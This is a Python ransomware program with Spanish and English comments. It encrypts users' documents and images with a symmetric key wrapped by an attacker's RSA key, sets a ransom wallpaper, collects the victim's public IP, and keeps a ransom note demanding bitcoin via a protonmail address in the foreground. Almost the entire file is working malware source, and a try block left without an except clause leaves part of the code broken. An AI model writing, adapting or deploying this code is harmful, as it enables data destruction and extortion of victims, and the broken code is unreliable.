# Imports
from cryptography.fernet import Fernet # Fernet es un paquete Python que proporciona cifrado simétrico y autenticación de datos.
import os # Maneja a configuracion y interaccion con el Sistema Operativo.
import webbrowser # En este caso la utilizaremos para abrir y cargar una URL utilizada en el codigo.
import ctypes # Provee la compatibilidad con el lenguaje "C"y archivos  DLL, aqui la utilizaremos para cambiar el background del escritorio.
import urllib.request # Usaremos para descargar una imagen y establecerla de fondo de escitorio.
import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
import time # tanto time como datetime se utilizan par aportar datos de hecha y hora
import datetime # 
import subprocess # En este caso la utilizaremos para abrir notepad y mostrar uan nota.
import win32gui # No recuerdo para que la use pero se que la use
from Crypto.PublicKey import RSA # algoritmo
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64
import threading # se usara para colocar la clave y desencriptar el sistema



class RansomWare:

    
    # las extensiones de los archivos que el programa buscara para encriptar

    file_exts = [
        'txt','doc','xls','jpg','png','pdf',
      
    ]

    def __init__(self):
        # Clave que se utilizará para el objeto Fernet y el método de cifrado/descifrado
        self.key = None
        # Encriptar/Desecriptar
        self.crypter = None
        # Clave pública RSA utilizada para cifrar/descifrar objetos fernet, por ejemplo, clave simétrica
        self.public_key = None

        '''  Directorios ROOT para iniciar el cifrado/descifrado
             PRECAUCIÓN: NO use self.sysRoot en su propia PC, ya que podría terminar estropeando su sistema, etc.
             PRECAUCIÓN: vaya a lo seguro, emule un directorio raíz para ver cómo funciona este software.
             PRECAUCIÓN: por ejemplo, use 'localRoot' y cree algún directorio de carpetas y archivos en esas carpetas, etc.
        '''
    
       
        self.sysRoot = os.path.expanduser('~')
       # Use localroot debajo para probar el software de encriptación y para la ruta absoluta de archivos y encriptación del "sistema de prueba"
       # Usar sysroot debajo para crear una ruta absoluta para archivos, etc. Y para encriptar todo el sistema
        self.localRoot = r'D:\Coding\Python\RansomWare\RansomWare_Software\localRoot' 

       # Obtenga la IP pública de la persona, para más análisis, etc. (Compruebe si ha accedido a gov, militar ip etc)
        self.publicIP = requests.get('https://api.ipify.org').text


    # Genera [CLAVE SIMÉTRICA] en la máquina de la víctima que se utiliza para cifrar los datos de la víctima
    def generate_key(self):
        # Genera una clave de URL segura (codificada en base64)
        self.key =  Fernet.generate_key()
       # Crea un objeto Fernet con métodos de cifrado/descifrado
        self.crypter = Fernet(self.key)

    
    # Escribir el fernet (clave simétrica) en el archivo de texto
    def write_key(self):
        with open('fernet_key.txt', 'wb') as f:
            f.write(self.key)

    # Cifrar [CLAVE SIMÉTRICA] que se creó en la máquina de la víctima para cifrar/descifrar archivos con nuestra ASIMÉTRICA PÚBLICA-
    # -Clave RSA que se creó en NUESTRA MÁQUINA. Más adelante podremos DESCIFRAR la CLAVE SISTÉMICA utilizada para-
    # -Cifrar/descifrar archivos en la máquina de destino con nuestra CLAVE PRIVADA, para que luego puedan descifrar archivos, etc.     
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key = fk.read()
        with open('fernet_key.txt', 'wb') as f:
            # RSA key
            self.public_key = RSA.import_key(open('public.pem').read())
            # Public encrypter object
            public_crypter =  PKCS1_OAEP.new(self.public_key)
            # Encrypted fernet key
            enc_fernent_key = public_crypter.encrypt(fernet_key)
            # Write encrypted fernet key to file
            f.write(enc_fernent_key)
        # Write encrypted fernet key to dekstop as well so they can send this file to be unencrypted and get system/files back
        with open(f'{self.sysRoot}Desktop/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernent_key)
        # Assign self.key to encrypted fernet key
        self.key = enc_fernent_key
        # Remove fernet crypter object
        self.crypter = None


   # [CLAVE SIMÉTRICA] Fernet Cifrar/Descifrar archivo - ruta_de_archivo:str:ruta de archivo absoluta, 
   # por ejemplo, C:/Carpeta/Carpeta/Carpeta/Nombre de archivo.txt
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            # Read data from file
            data = f.read()
            if not encrypted:
                # Print file contents - [debugging]
                print(data)
                # Encrypt data from file
                _data = self.crypter.encrypt(data)
                # Log file encrypted and print encrypted contents - [debugging]
                print('> File encrpyted')
                print(_data)
            else:
                # Decrypt data from file
                _data = self.crypter.decrypt(data)
                # Log file decrypted and print decrypted contents - [debugging]
                print('> File decrpyted')
                print(_data)
        with open(file_path, 'wb') as fp:
            # Write encrypted/decrypted data to file using same filename to overwrite original file
            fp.write(_data)


    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)


    @staticmethod
    def what_is_bitcoin():
        url = 'https://bitcoin.org'
        # abre el navegador a https://bitcoin.org 
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://raw.githubusercontent.com/DaniAndrada1980/images/main/Ransomware2.jpg'
        #NO vayan a ser tan idiotas como yo de colocar un link a una imagen de su propio repositorio =)=)=)
        # Va la URL especficada descarga la imagen y la establece como fondo de escritorio
        path = f'{self.sysRoot}Desktop/background.jpg'
        urllib.request.urlretrieve(imageUrl, path)
        SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
Los archivos de su ordenador han sido encriptados con un algoritmo de encriptación alto grado.
No podrá restaurar sus datos sin una clave.

Para comprar la clave y restaurar su equipo, siga esta instrucciones:

1. Envíe por correo electrónico el archivo llamado EMAIL_ME.txt a {self.sysRoot}Desktop/EMAIL_ME.txt a GetYourFilesBack@protonmail.com

2. Recibirá su dirección BTC personal para el pago.
   Una vez que se haya completado el pago, envíe otro correo electrónico a GetYourFilesBack@protonmail.com indicando "YA HE PAGADO".
   Verificaremos si el pago ha sido pagado.

3. Recibirá un archivo de texto con LA CLAVE que desbloqueará sus archivos.
   IMPORTANTE: para descifrar sus archivos, coloque el archivo de texto en el escritorio y espere. 
   se comenzarán a descifrar todos los archivos automaticamente.

''')            



    def show_ransom_note(self):
        # abre la nota .txt que habla acerca del rescate
        ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        count = 0 
        while True:
            time.sleep(0.1)
            top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            if top_window == 'RANSOM_NOTE - Notepad':
                print('Ransom note is the top window - do nothing') 
                pass
            else:
                print('Ransom note is not the top window - kill/create process again') 
                time.sleep(0.1)
                ransom.kill()
                time.sleep(0.1)
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
            time.sleep(10)
            count +=1 
            if count == 5:
                break

    
    # Descifra el sistema cuando un archivo de texto con una clave sin cifrar 
    # se coloca en el escritorio de la máquina de destino
    def put_me_on_desktop(self):
       # Bucle para verificar el archivo y si el archivo leerá la clave y luego self.key
       #  + self.cryptor serán válidos para descifrar los archivos
        print('started') 
        while True:
            try:
                print('trying') # Debugging/Testing
                # El ATACANTE descifra la clave simétrica fernet en su máquina y luego coloca 
                # la clave fernet sin cifrar.
                # -ingresa este archivo y lo envía en un correo electrónico a la víctima. Luego ponen 
                # esto en el escritorio y será-
                # -utilizado para descifrar el sistema. EN NINGÚN MOMENTO LES DAMOS LA LLAVE ASYEMTRIC PRIVADA etc.
                
                with open(f'{self.sysRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    
                    self.crypt_system(encrypted=True)
                    print('decrypted') 
                print() 
                pass
            time.sleep(10) 
            print('Checking for PUT_ME_ON_DESKTOP.txt') 
          



def main():
    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()
    rw.change_desktop_background()
    rw.what_is_bitcoin()
    rw.ransom_note()

    t1 = threading.Thread(target=rw.show_ransom_note)
    t2 = threading.Thread(target=rw.put_me_on_desktop)

    t1.start()
    print('> RansomWare: Attack completed on target machine and system is encrypted') 
    print('> RansomWare: Waiting for attacker to give target machine document that will un-encrypt machine') # Debugging/Testing
    t2.start()
    print('> RansomWare: Target machine has been un-encrypted') 
    print('> RansomWare: Completed') 



if __name__ == '__main__':
    main()
 
